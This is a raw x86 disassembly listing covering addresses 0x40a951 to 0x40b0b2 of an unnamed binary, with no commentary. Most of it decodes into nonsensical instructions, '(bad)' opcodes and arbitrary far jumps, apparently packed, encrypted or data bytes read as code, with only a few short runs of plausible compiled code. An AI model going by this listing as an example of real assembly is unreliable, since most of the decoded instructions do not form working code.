  40a951:	js     0x40a9cb
  40a953:	imul   esp,ebp,0x766caf67
  40a959:	mov    bh,0x5a
  40a95b:	(bad)  [eax]
  40a95d:	fwait
  40a95e:	stos   BYTE PTR es:[edi],al
  40a95f:	popf   
  40a960:	scas   al,BYTE PTR es:[edi]
  40a961:	mov    BYTE PTR [ebx-0x79],bl
  40a964:	and    eax,0xeef07e22
  40a969:	int3   
  40a96a:	mov    ecx,0x6ee53eed
  40a96f:	inc    ebx
  40a970:	jbe    0x40a98a
  40a972:	inc    edx
  40a973:	push   ds
  40a974:	xchg   BYTE PTR [ebx+0x4902e351],bl
  40a97a:	scas   eax,DWORD PTR es:[edi]
  40a97b:	jae    0x40a938
  40a97d:	test   eax,0x510998ce
  40a982:	enter  0xc69b,0x23
  40a986:	push   esi
  40a987:	mov    al,0x7
  40a989:	cmp    BYTE PTR [ecx+0x43937c11],dl
  40a98f:	daa    
  40a990:	or     cl,BYTE PTR [ebp+ebp*2+0x3e]
  40a994:	int    0x4f
  40a996:	retf   0x3c84
  40a999:	xor    eax,0x8b27d671
  40a99e:	mov    ebx,0x1c185a69
  40a9a3:	inc    edx
  40a9a4:	mov    ch,0x35
  40a9a6:	cmp    ebx,DWORD PTR [ebx+0x31f52fb3]
  40a9ac:	pop    ecx
  40a9ad:	inc    ebp
  40a9ae:	cli    
  40a9af:	mov    WORD PTR [ebx+0x40],?
  40a9b2:	(bad)  
  40a9b3:	loope  0x40aa19
  40a9b5:	mov    ah,0xc1
  40a9b7:	cmp    DWORD PTR [ecx-0x74],esi
  40a9ba:	xchg   BYTE PTR [edi-0x4d],ch
  40a9bd:	push   edx
  40a9be:	mov    edi,0x782ee639
  40a9c3:	(bad)  
  40a9c4:	fsub   DWORD PTR [ecx-0x2e1351e6]
  40a9ca:	dec    esp
  40a9cb:	popf   
  40a9cc:	aad    0x1b
  40a9ce:	or     dl,dl
  40a9d0:	jge    0x40aa23
  40a9d2:	in     eax,0xae
  40a9d4:	xchg   edi,eax
  40a9d5:	sbb    eax,esp
  40a9d7:	cmp    ebp,DWORD PTR [eax-0x1b771fd0]
  40a9dd:	inc    edx
  40a9de:	icebp  
  40a9df:	push   edi
  40a9e0:	fisub  DWORD PTR [eax+eiz*8+0x30bec670]
  40a9e7:	imul   ecx,DWORD PTR [eax-0x4d01fa33],0xbed12b53
  40a9f1:	inc    ebx
  40a9f2:	gs loopne 0x40aa70
  40a9f5:	mov    dh,0x42
  40a9f7:	jmp    0xf62f:0xdea4aada
  40a9fe:	xor    al,0x5e
  40aa00:	cs inc esp
  40aa02:	mov    cl,0x99
  40aa04:	inc    edx
  40aa05:	inc    BYTE PTR [edx+0x3d0297c0]
  40aa0b:	(bad)  
  40aa0c:	(bad)  
  40aa0d:	jg     0x40a9cd
  40aa0f:	jp     0x40a9b1
  40aa11:	fisttp WORD PTR [ecx]
  40aa13:	cmp    DWORD PTR [ecx],ebp
  40aa15:	fist   WORD PTR [eax-0xa31e9b0]
  40aa1b:	loope  0x40a9be
  40aa1d:	inc    esp
  40aa1e:	and    ch,BYTE PTR [edx+0x48]
  40aa21:	xchg   esi,eax
  40aa22:	popf   
  40aa23:	push   edi
  40aa24:	stos   DWORD PTR es:[edi],eax
  40aa25:	push   es
  40aa26:	fs and bh,0xbb
  40aa2a:	jb     0x40a9b8
  40aa2c:	mov    dl,0xac
  40aa2e:	lds    ecx,FWORD PTR [ebp-0xe9b85d4]
  40aa34:	inc    esp
  40aa35:	push   ds
  40aa36:	jmp    0x40aa14
  40aa38:	sbb    eax,0x2d91e006
  40aa3d:	iret   
  40aa3e:	mov    ds:0x862b7fef,eax
  40aa43:	sub    eax,0xcd30a5d9
  40aa48:	sti    
  40aa49:	adc    DWORD PTR [ebx],esi
  40aa4b:	sub    bl,BYTE PTR [ecx]
  40aa4d:	aad    0xe9
  40aa4f:	fldcw  WORD PTR [ecx+0xc]
  40aa52:	mov    BYTE PTR [eax+0x3b],dl
  40aa55:	pushf  
  40aa56:	cmp    BYTE PTR [eax+ebx*1+0x52a6ba48],al
  40aa5d:	adc    esi,DWORD PTR [esp+edx*8]
  40aa60:	inc    eax
  40aa61:	xchg   ebp,eax
  40aa62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa63:	push   esp
  40aa64:	out    dx,al
  40aa65:	dec    eax
  40aa66:	(bad)  
  40aa67:	push   ss
  40aa68:	test   BYTE PTR [ebx-0x681e0d2c],al
  40aa6e:	push   ecx
  40aa6f:	mov    ebp,0xe9a07b04
  40aa74:	xor    ch,BYTE PTR [ebp-0x1b8d7d7e]
  40aa7a:	and    ecx,DWORD PTR [esi+0x8727b01]
  40aa80:	xor    dh,BYTE PTR [ebp+0x33d0210a]
  40aa86:	idiv   BYTE PTR [esi+0x60]
  40aa89:	jbe    0x40aabe
  40aa8b:	and    al,0x77
  40aa8d:	dec    edx
  40aa8e:	xor    bh,BYTE PTR [edx+0x681c1746]
  40aa94:	push   esp
  40aa95:	(bad)  
  40aa96:	xchg   esp,eax
  40aa97:	cmc    
  40aa98:	pop    ebp
  40aa99:	mov    ?,WORD PTR [ecx+edx*2+0x50]
  40aa9d:	mov    cl,0x32
  40aa9f:	mov    edx,0xa1eac430
  40aaa4:	loop   0x40aa8a
  40aaa6:	pop    eax
  40aaa7:	cmp    ecx,DWORD PTR [eax-0x78]
  40aaaa:	out    0xa5,al
  40aaac:	jmp    DWORD PTR [ecx+0x1e]
  40aaaf:	rol    BYTE PTR [ebx+esi*8],cl
  40aab2:	push   eax
  40aab3:	or     al,0xcc
  40aab5:	(bad)  
  40aab6:	shr    BYTE PTR [edi-0x2d],0x85
  40aaba:	test   al,0x42
  40aabc:	or     BYTE PTR [esi-0x423167c6],bl
  40aac2:	(bad)  
  40aac3:	aaa    
  40aac4:	div    DWORD PTR [edi]
  40aac6:	adc    esi,DWORD PTR [edx-0x7c]
  40aac9:	mov    al,ds:0xe63c89f1
  40aace:	push   eax
  40aacf:	mov    eax,0x2e37c154
  40aad4:	sbb    BYTE PTR [esi+0x2a54b9d2],bl
  40aada:	pop    es
  40aadb:	enter  0x3a20,0x10
  40aadf:	mov    al,0x17
  40aae1:	aam    0xe8
  40aae3:	xor    eax,0x9a1efafb
  40aae8:	cmp    eax,0x7f7caaea
  40aaed:	cwde   
  40aaee:	push   ebp
  40aaef:	dec    BYTE PTR [edi+0x22]
  40aaf2:	mov    al,0x6d
  40aaf4:	icebp  
  40aaf5:	xchg   ebx,eax
  40aaf6:	cs pop ecx
  40aaf8:	sbb    al,0xd2
  40aafa:	mov    esp,0xa9ec18c3
  40aaff:	mov    DWORD PTR [ebp-0x47cb233d],edi
  40ab05:	mov    ch,0xc9
  40ab07:	and    eax,DWORD PTR [eax]
  40ab09:	jb     0x40ab57
  40ab0b:	and    al,0xb5
  40ab0d:	xchg   ebx,eax
  40ab0e:	mov    ebp,0xa8475d2c
  40ab13:	inc    edi
  40ab14:	cdq    
  40ab15:	lods   al,BYTE PTR ds:[esi]
  40ab16:	jo     0x40ab1f
  40ab18:	push   edi
  40ab19:	cs dec ecx
  40ab1b:	xchg   ecx,eax
  40ab1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab1e:	enter  0xe89,0x71
  40ab22:	mov    edi,edx
  40ab24:	shl    DWORD PTR [edi+0x16cb060a],1
  40ab2a:	add    BYTE PTR [esi-0x1188f31c],ah
  40ab30:	addr16 jnp 0x40aaf8
  40ab33:	out    dx,eax
  40ab34:	xlat   BYTE PTR ds:[ebx]
  40ab35:	punpckldq mm4,mm7
  40ab38:	pop    ebx
  40ab39:	repz mov eax,ds:0x3d89b995
  40ab3f:	mov    ebx,0xb7b91460
  40ab44:	sahf   
  40ab45:	adc    eax,0x793220fe
  40ab4a:	loope  0x40ab1c
  40ab4c:	(bad)  
  40ab4d:	dec    esp
  40ab4e:	test   al,0x2c
  40ab50:	jecxz  0x40ab1b
  40ab52:	and    al,al
  40ab54:	push   es
  40ab55:	dec    edx
  40ab56:	jg     0x40ab31
  40ab58:	outs   dx,DWORD PTR ds:[esi]
  40ab59:	(bad)  
  40ab5a:	repnz (bad) 
  40ab5c:	pop    ecx
  40ab5d:	add    al,0x89
  40ab5f:	dec    edi
  40ab60:	inc    ebx
  40ab61:	aam    0x17
  40ab63:	mov    cs,WORD PTR [edi-0x536dbe79]
  40ab69:	and    DWORD PTR [edi],esi
  40ab6b:	pop    ebx
  40ab6c:	mov    dl,0x27
  40ab6e:	maxps  xmm0,xmm6
  40ab71:	mov    ds:0x474912ad,eax
  40ab76:	or     ch,BYTE PTR [ecx]
  40ab78:	xor    eax,0x197036b9
  40ab7d:	ja     0x40ab21
  40ab7f:	ins    DWORD PTR es:[edi],dx
  40ab80:	inc    eax
  40ab81:	out    dx,eax
  40ab82:	(bad)  
  40ab84:	push   cs
  40ab85:	call   0xcb165537
  40ab8a:	or     al,0x16
  40ab8c:	xchg   DWORD PTR [ebx+0x13],ecx
  40ab8f:	sub    bl,BYTE PTR [esi-0x6f]
  40ab92:	popf   
  40ab93:	mov    bl,0x26
  40ab95:	scas   al,BYTE PTR es:[edi]
  40ab96:	xchg   edx,eax
  40ab97:	addr16 call 0xa4b3:0x19a950e9
  40ab9f:	adc    edi,eax
  40aba1:	jno    0x40ab2d
  40aba3:	adc    DWORD PTR [ebx],esi
  40aba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aba6:	rcr    DWORD PTR [eax*1+0x21e3b242],0x9
  40abae:	ds inc edx
  40abb0:	outs   dx,DWORD PTR ds:[esi]
  40abb1:	test   BYTE PTR [edi],dh
  40abb3:	push   0xa0f86487
  40abb8:	pop    esp
  40abb9:	jns    0x40ab4b
  40abbb:	adc    DWORD PTR [eax+0x27006408],0x7a643ad9
  40abc5:	push   ebp
  40abc6:	shl    ch,cl
  40abc8:	cmp    al,0x28
  40abca:	mov    dl,0xf5
  40abcc:	popf   
  40abcd:	push   ecx
  40abce:	loope  0x40ac3e
  40abd0:	dec    ecx
  40abd1:	sub    BYTE PTR [edx+0x1c5f4858],ch
  40abd7:	or     BYTE PTR [edx+0x26],al
  40abda:	sbb    ch,bh
  40abdc:	icebp  
  40abdd:	cwde   
  40abde:	dec    esi
  40abdf:	pushf  
  40abe0:	pop    edi
  40abe1:	dec    edi
  40abe2:	pop    eax
  40abe3:	lahf   
  40abe4:	scas   eax,DWORD PTR es:[edi]
  40abe5:	mov    cl,0x5b
  40abe7:	inc    edx
  40abe8:	test   BYTE PTR ds:0x9962a714,dh
  40abee:	push   edx
  40abef:	inc    esp
  40abf0:	lock and bl,BYTE PTR [edx-0x20]
  40abf4:	sub    cl,BYTE PTR [ebx-0x5eaf5fde]
  40abfa:	test   BYTE PTR [eax-0x6],ch
  40abfd:	jno    0x40ac64
  40abff:	test   DWORD PTR [edi],esp
  40ac01:	push   cs
  40ac02:	sbb    ebx,ecx
  40ac04:	xchg   ecx,eax
  40ac05:	dec    ebx
  40ac06:	cmp    ebp,esi
  40ac08:	xchg   esp,eax
  40ac09:	push   esp
  40ac0a:	pop    eax
  40ac0b:	inc    edi
  40ac0c:	xor    BYTE PTR [edi-0x1d609bc3],bl
  40ac12:	repnz loop 0x40ac80
  40ac15:	out    dx,al
  40ac16:	enter  0x994a,0x1d
  40ac1a:	sahf   
  40ac1b:	fcmovnu st,st(1)
  40ac1d:	push   esi
  40ac1e:	mov    ds:0xc41c9643,eax
  40ac23:	int3   
  40ac24:	adc    DWORD PTR [eax-0x531013a3],0x7e7948fc
  40ac2e:	mov    ebp,0xc85b8701
  40ac33:	cmp    al,0xa5
  40ac35:	push   ds
  40ac36:	pop    ebp
  40ac37:	pop    ebp
  40ac38:	loope  0x40ac5b
  40ac3a:	retf   
  40ac3b:	rcr    DWORD PTR [edi],1
  40ac3d:	aas    
  40ac3e:	(bad)  
  40ac40:	adc    edx,edx
  40ac42:	sbb    ebp,DWORD PTR [edi+0x49]
  40ac45:	and    ebp,DWORD PTR [eax+ebp*8-0xe650e06]
  40ac4c:	mov    bh,0x52
  40ac4e:	xlat   BYTE PTR ds:[ebx]
  40ac4f:	xor    ebx,ecx
  40ac51:	xor    edx,edx
  40ac53:	add    eax,esi
  40ac55:	add    ebx,esi
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	push   gs
  40ac8d:	xor    BYTE PTR [eax],0xac
  40ac90:	(bad)  
  40ac91:	cmp    BYTE PTR [eax+0x78],0x74
  40ac95:	jle    0x40ad0f
  40ac97:	js     0x40ac9c
  40ac99:	jne    0x40ac71
  40ac9b:	(bad)  
  40ac9d:	and    WORD PTR ds:0x3f63639d,di
  40aca4:	mov    bh,0x46
  40aca6:	aaa    
  40aca7:	cmp    BYTE PTR [ebp+0xbd37658],ch
  40acad:	adc    ecx,DWORD PTR [ebx+eiz*4+0x1dbaddda]
  40acb4:	add    al,0x44
  40acb6:	addr16 inc ebx
  40acb8:	(bad)  
  40acb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acba:	mov    BYTE PTR [edi+ecx*8+0x6d9e15c1],ch
  40acc1:	leave  
  40acc2:	out    dx,eax
  40acc3:	bnd jae 0x40ac9d
  40acc6:	sar    BYTE PTR [ebp+0x67b5f4c2],0xd5
  40accd:	shr    eax,cl
  40accf:	dec    ebp
  40acd0:	inc    esi
  40acd1:	cmp    DWORD PTR [eax*4-0x28e81c7e],eax
  40acd8:	mov    edx,0x6d80360d
  40acdd:	or     DWORD PTR [esi+0x6d],ebx
  40ace0:	enter  0xa99b,0xd2
  40ace4:	sbb    ebx,DWORD PTR [ebp+0x1b299db7]
  40acea:	sti    
  40aceb:	pop    esi
  40acec:	add    dl,ah
  40acee:	leave  
  40acef:	imul   ecx,DWORD PTR [edi-0x5e],0x1f
  40acf3:	pop    ds
  40acf4:	fisub  DWORD PTR [ebp-0x17]
  40acf7:	jle    0x40ad4e
  40acf9:	inc    eax
  40acfa:	push   esi
  40acfb:	adc    DWORD PTR [ecx-0xf],ebp
  40acfe:	push   esi
  40acff:	(bad)  
  40ad00:	je     0x40ad68
  40ad02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad03:	mov    eax,ds:0x174e3408
  40ad08:	add    ebx,ebp
  40ad0a:	adc    al,0x8b
  40ad0c:	sti    
  40ad0d:	nop
  40ad0e:	fild   QWORD PTR [ebp+edi*8-0x272c9be]
  40ad15:	xchg   ebp,eax
  40ad16:	daa    
  40ad17:	call   0x7b72430c
  40ad1c:	fadd   DWORD PTR [ecx+0x1c]
  40ad1f:	push   esp
  40ad20:	add    al,0x50
  40ad22:	adc    BYTE PTR [esi-0x4d],al
  40ad25:	mov    esi,0x8a001cbe
  40ad2a:	push   0x92cda954
  40ad2f:	cmc    
  40ad30:	sti    
  40ad31:	mov    bh,0x50
  40ad33:	inc    eax
  40ad34:	outs   dx,BYTE PTR ds:[esi]
  40ad35:	jne    0x40ad79
  40ad37:	icebp  
  40ad38:	pop    ss
  40ad39:	(bad)  
  40ad3a:	popa   
  40ad3b:	jmp    0x40adba
  40ad3d:	jbe    0x40ace9
  40ad3f:	xor    edx,DWORD PTR [eax+0xfb10a37]
  40ad45:	dec    edi
  40ad46:	fild   DWORD PTR [esi-0x55]
  40ad49:	mov    ah,BYTE PTR [edx-0xd86cfca]
  40ad4f:	pop    es
  40ad50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad51:	ror    edi,1
  40ad53:	ins    BYTE PTR es:[edi],dx
  40ad54:	stos   DWORD PTR es:[edi],eax
  40ad55:	mov    ecx,0xff1d47f1
  40ad5a:	stc    
  40ad5b:	adc    BYTE PTR [edx-0x5f],0x7e
  40ad5f:	adc    DWORD PTR [eax-0x4ec534c9],ebx
  40ad65:	sbb    eax,0xbd665c59
  40ad6a:	xchg   esi,eax
  40ad6b:	inc    ebx
  40ad6c:	js     0x40ad87
  40ad6e:	jle    0x40ad23
  40ad70:	fnstcw WORD PTR [esi-0x124c5810]
  40ad76:	mov    ah,0x3a
  40ad78:	icebp  
  40ad79:	adc    BYTE PTR [esi],bl
  40ad7b:	pop    edx
  40ad7c:	in     al,dx
  40ad7d:	sub    ecx,DWORD PTR [eax+0x1a]
  40ad80:	xor    ch,ah
  40ad82:	cmp    DWORD PTR [eax],0x3c05c6d4
  40ad88:	test   BYTE PTR [esp+eiz*4],ch
  40ad8b:	or     ah,BYTE PTR [edx+0x13]
  40ad8e:	lea    ecx,[edx+0xd644ea5]
  40ad94:	sar    edi,1
  40ad96:	aad    0x2c
  40ad98:	pop    ss
  40ad99:	xchg   edx,esi
  40ad9b:	sti    
  40ad9c:	jnp    0x40ada3
  40ad9e:	sub    dl,BYTE PTR [edi-0x2f]
  40ada1:	jne    0x40adef
  40ada3:	add    al,0xb4
  40ada5:	add    DWORD PTR [ebp+0x6b],ebp
  40ada8:	je     0x40ad7b
  40adaa:	push   esp
  40adab:	xor    eax,0x775e43a9
  40adb0:	sbb    edx,DWORD PTR [eax-0x64be06ab]
  40adb6:	in     al,dx
  40adb7:	pop    edx
  40adb8:	arpl   WORD PTR [esi+ecx*2+0x53b11efc],di
  40adbf:	dec    esi
  40adc0:	jns    0x40add3
  40adc2:	ins    BYTE PTR es:[edi],dx
  40adc3:	push   edi
  40adc4:	mov    esp,0xed61cba
  40adc9:	icebp  
  40adca:	daa    
  40adcb:	aaa    
  40adcc:	nop
  40adcd:	mov    ebx,0x1e05c08
  40add2:	mov    ds:0xbb055eaa,eax
  40add7:	test   al,0xf2
  40add9:	pop    esp
  40adda:	imul   ebp,DWORD PTR [esi],0xe40045d4
  40ade0:	mov    BYTE PTR [edi+ebp*4],bh
  40ade3:	cmp    ebp,edi
  40ade5:	push   ss
  40ade6:	pop    ebp
  40ade7:	xchg   ebp,eax
  40ade8:	stc    
  40ade9:	lods   al,BYTE PTR ds:[esi]
  40adea:	sub    BYTE PTR [ebx],dh
  40adec:	ins    BYTE PTR es:[edi],dx
  40aded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adee:	jne    0x40adc4
  40adf0:	and    al,0x25
  40adf2:	adc    cl,BYTE PTR [esi+ecx*2]
  40adf5:	mov    ebp,0xf3cd9ddf
  40adfa:	dec    ebp
  40adfb:	repnz repnz ds add eax,0xe0d5b5c9
  40ae03:	faddp  st(7),st
  40ae05:	xchg   edi,eax
  40ae06:	xor    eax,0x2e9bacb0
  40ae0b:	call   0x3b9945e
  40ae10:	das    
  40ae11:	mov    WORD PTR [ebx+0x44805671],cs
  40ae17:	push   0x2f3bcc7b
  40ae1c:	shl    DWORD PTR [ebx],1
  40ae1e:	into   
  40ae1f:	jl     0x40ae36
  40ae21:	dec    edx
  40ae22:	aad    0xb2
  40ae24:	push   esi
  40ae25:	push   edi
  40ae26:	out    0xc9,eax
  40ae28:	xchg   ebx,eax
  40ae29:	les    esi,FWORD PTR [edx+ecx*2+0x15f1504b]
  40ae30:	xlat   BYTE PTR ds:[ebx]
  40ae31:	push   0x255f313c
  40ae36:	sub    BYTE PTR [ebx+0x3f],bl
  40ae39:	cmp    DWORD PTR [edx-0x3],ebx
  40ae3c:	pop    ds
  40ae3d:	pop    ss
  40ae3e:	cmp    al,0xcc
  40ae40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae41:	pop    eax
  40ae42:	lds    esi,FWORD PTR [edx-0x3bf1fc78]
  40ae48:	loopne 0x40ae5c
  40ae4a:	cmp    edi,esi
  40ae4c:	pop    esp
  40ae4d:	or     al,BYTE PTR [esp+edx*2+0x4128e17e]
  40ae54:	int3   
  40ae55:	or     cl,BYTE PTR [edi-0x5c]
  40ae58:	mov    esp,0x347e7914
  40ae5d:	cmp    eax,0xfaf826ca
  40ae62:	mov    al,ds:0xcefef838
  40ae67:	mov    al,0x9e
  40ae69:	cld    
  40ae6a:	test   DWORD PTR [ebx],0x1849307d
  40ae70:	jne    0x40ae7c
  40ae72:	cdq    
  40ae73:	push   0x4d27f0d4
  40ae78:	push   es
  40ae79:	mov    edi,DWORD PTR [ebx+ebx*4-0x51b42793]
  40ae80:	inc    edi
  40ae81:	add    bh,cl
  40ae83:	mov    al,0xf3
  40ae85:	jecxz  0x40ae56
  40ae87:	out    0x28,al
  40ae89:	fdivr  DWORD PTR cs:[ebx-0x31]
  40ae8d:	jnp    0x40aee9
  40ae8f:	(bad)  
  40ae90:	das    
  40ae91:	ror    dh,cl
  40ae93:	iret   
  40ae94:	push   ebx
  40ae95:	xor    WORD PTR [eax],sp
  40ae98:	mov    cl,0x65
  40ae9a:	dec    ebp
  40ae9b:	jg     0x40aee8
  40ae9d:	sbb    eax,DWORD PTR [eax+0x7254bcc5]
  40aea3:	(bad)  
  40aea5:	dec    edx
  40aea6:	and    al,0x15
  40aea8:	or     al,0x4c
  40aeaa:	sbb    DWORD PTR [edi-0x25dc9ef7],ecx
  40aeb0:	sbb    BYTE PTR [ebp+0x66],ah
  40aeb3:	and    BYTE PTR [edx+ecx*2-0x62],0x3
  40aeb8:	mov    ebp,0xa734efbb
  40aebd:	nop
  40aebe:	loop   0x40aec4
  40aec0:	rol    bh,cl
  40aec2:	jmp    0x40aec6
  40aec4:	mov    edx,0x30c7fa60
  40aec9:	and    bl,bh
  40aecb:	fisttp DWORD PTR [ebp+esi*2+0x5b]
  40aecf:	retf   0xde59
  40aed2:	inc    esp
  40aed3:	mov    ?,WORD PTR [esi+0x60]
  40aed6:	xchg   ebx,eax
  40aed7:	clc    
  40aed8:	bound  ebp,QWORD PTR [ebx+0x74]
  40aedb:	in     eax,dx
  40aedc:	rcr    DWORD PTR [ebp+0x1c],1
  40aedf:	mov    bl,0x71
  40aee1:	cmp    DWORD PTR [ecx],ebx
  40aee3:	jmp    0x91120bbc
  40aee8:	mov    eax,0x6dabaa55
  40aeed:	jg     0x40ae6f
  40aeef:	mov    ebx,0x27904eb2
  40aef4:	sti    
  40aef5:	lods   eax,DWORD PTR ds:[esi]
  40aef6:	xchg   ecx,eax
  40aef7:	sub    DWORD PTR [ecx+0x64],ebp
  40aefa:	dec    ecx
  40aefb:	xchg   esi,eax
  40aefc:	sahf   
  40aefd:	mov    esi,0x71441f31
  40af02:	sbb    DWORD PTR [edx+edx*2+0x384975db],ebp
  40af09:	jae    0x40aede
  40af0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af0c:	jbe    0x40af7c
  40af0e:	sbb    eax,0x50fed549
  40af13:	out    0xe9,al
  40af15:	lds    esp,FWORD PTR [ebx]
  40af17:	mov    esp,0x134404f8
  40af1c:	sub    eax,0x7d936a83
  40af21:	in     eax,0xba
  40af23:	fsubr  QWORD PTR [ecx+0x10]
  40af26:	dec    ebx
  40af27:	add    ah,ah
  40af29:	mov    ecx,esi
  40af2b:	jl     0x40af2b
  40af2d:	repz jp 0x40aebd
  40af30:	mov    esi,0x1b375394
  40af35:	test   al,0x92
  40af37:	mov    edx,ds
  40af39:	push   edi
  40af3a:	lods   eax,DWORD PTR ds:[esi]
  40af3b:	stc    
  40af3c:	or     eax,0x249456ea
  40af41:	ins    DWORD PTR es:[edi],dx
  40af42:	or     eax,edx
  40af44:	inc    eax
  40af45:	add    BYTE PTR [edx],bh
  40af47:	inc    ecx
  40af48:	xchg   esp,eax
  40af49:	test   ebx,ebx
  40af4b:	push   0xffffffdb
  40af4d:	adc    ah,dl
  40af4f:	cmp    esp,esp
  40af51:	rcl    bl,cl
  40af53:	arpl   WORD PTR [ebp-0x5],sp
  40af56:	test   DWORD PTR [edi-0x76],ebx
  40af59:	cmc    
  40af5a:	cmp    eax,0x7facfb2b
  40af5f:	imul   edx,DWORD PTR [edi+0x2b6c4521],0x9c0b066d
  40af69:	aam    0xbf
  40af6b:	pop    esi
  40af6c:	push   ds
  40af6d:	sub    al,0xba
  40af6f:	cmp    eax,0x7701d3af
  40af74:	arpl   dx,cx
  40af76:	mov    edi,0xbefd4306
  40af7b:	mov    DWORD PTR [eax],ecx
  40af7d:	(bad)  
  40af7e:	sahf   
  40af7f:	retf   0xabbc
  40af82:	leave  
  40af83:	push   ss
  40af84:	mov    DWORD PTR [edx+0x3662ef85],ebp
  40af8a:	(bad)  
  40af8b:	sub    eax,0xee78ca1
  40af90:	fild   QWORD PTR [eax+0x108bf9ff]
  40af96:	imul   edx,edx,0xf89ea9ed
  40af9c:	mov    DWORD PTR [eax],edx
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	or     BYTE PTR [esi-0x7a2dc10d],ah
  40afb8:	js     0x40b032
  40afba:	je     0x40b03a
  40afbc:	js     0x40b036
  40afbe:	jp     0x40afa3
  40afc0:	stos   BYTE PTR es:[edi],al
  40afc1:	adc    ch,ch
  40afc3:	pop    esp
  40afc4:	rcl    DWORD PTR [ebp+0xecd5e70],cl
  40afca:	ds inc edx
  40afcc:	pop    si
  40afce:	xchg   DWORD PTR [ecx-0x1e],ebx
  40afd1:	mov    al,0xd5
  40afd3:	and    DWORD PTR [ebx+eiz*8-0x60fdd479],eax
  40afda:	leave  
  40afdb:	cmc    
  40afdc:	cld    
  40afdd:	hlt    
  40afde:	mov    esi,0xbb78f6dc
  40afe3:	pop    ecx
  40afe4:	xchg   ebp,eax
  40afe5:	inc    edi
  40afe6:	imul   esi,DWORD PTR [edi-0x6f],0x6e
  40afea:	lds    eax,FWORD PTR [ecx+0x32]
  40afed:	rol    ebx,0xa9
  40aff0:	mov    dl,0x2
  40aff2:	enter  0x80f0,0x9f
  40aff6:	and    al,0x3
  40aff8:	add    eax,DWORD PTR [esi+0x11]
  40affb:	lahf   
  40affc:	test   DWORD PTR [ecx+eiz*8+0x1fcb62d8],esi
  40b003:	mov    ah,0xde
  40b005:	xor    edx,eax
  40b007:	xchg   edx,eax
  40b008:	mov    DWORD PTR [edi],esp
  40b00a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b00b:	das    
  40b00c:	mov    esp,0x27b19a16
  40b011:	pop    edx
  40b012:	daa    
  40b013:	les    edx,FWORD PTR [eax-0x3f486fb1]
  40b019:	clc    
  40b01a:	dec    ecx
  40b01b:	icebp  
  40b01c:	sahf   
  40b01d:	mov    al,ds:0x6e89fe83
  40b022:	push   edx
  40b023:	jl     0x40afa9
  40b025:	and    dl,BYTE PTR [esi-0x57d3a437]
  40b02b:	sub    eax,0x41da9da7
  40b030:	xor    ah,bl
  40b032:	je     0x40b073
  40b034:	or     ebp,ecx
  40b036:	(bad)  
  40b037:	mov    cl,0x23
  40b039:	xchg   ebp,eax
  40b03a:	das    
  40b03b:	ja     0x40b04c
  40b03d:	xor    al,ah
  40b03f:	xchg   ebp,eax
  40b040:	test   BYTE PTR [eax+0x5e74e980],dh
  40b046:	and    eax,0x5434ac69
  40b04b:	stos   DWORD PTR es:[edi],eax
  40b04c:	in     al,0xc6
  40b04e:	gs cmp esi,esp
  40b051:	xlat   BYTE PTR ds:[ebx]
  40b052:	fcmovu st,st(0)
  40b054:	rol    ecx,0xf6
  40b057:	jmp    0x66dc:0x6bb2618b
  40b05e:	sbb    cl,bh
  40b060:	retf   
  40b061:	ds sbb eax,0x2a0cccdb
  40b067:	xchg   BYTE PTR [edx+0x14],al
  40b06a:	dec    eax
  40b06b:	dec    eax
  40b06c:	sub    eax,0xbcc91a0c
  40b071:	push   ss
  40b072:	jne    0x40b097
  40b074:	push   0x3cfe60bf
  40b079:	push   cs
  40b07a:	es xchg ebx,eax
  40b07c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b07d:	pop    ebp
  40b07e:	cld    
  40b07f:	adc    al,0x24
  40b081:	mov    bl,0x48
  40b083:	loope  0x40b02f
  40b085:	xchg   ebp,eax
  40b086:	or     ch,BYTE PTR [esi-0x13]
  40b089:	inc    edx
  40b08a:	sbb    dh,dl
  40b08c:	xchg   BYTE PTR [esi],ah
  40b08e:	mov    bl,0xac
  40b090:	xchg   edi,eax
  40b091:	adc    ah,bh
  40b093:	fwait
  40b094:	outs   dx,DWORD PTR ds:[esi]
  40b095:	cmp    al,0x2f
  40b097:	xchg   ebx,eax
  40b098:	ds inc esi
  40b09a:	lea    ecx,[edx-0x75a5350]
  40b0a0:	inc    ebx
  40b0a1:	in     eax,0xc8
  40b0a3:	cmp    esi,0xffffff97
  40b0a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0a7:	inc    esi
  40b0a8:	ss mov cl,0xfe
  40b0ab:	dec    ebp
  40b0ac:	outs   dx,BYTE PTR ds:[esi]
  40b0ad:	sti    
  40b0ae:	mov    ah,0xcc
  40b0b0:	ss xchg ebp,eax
  40b0b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
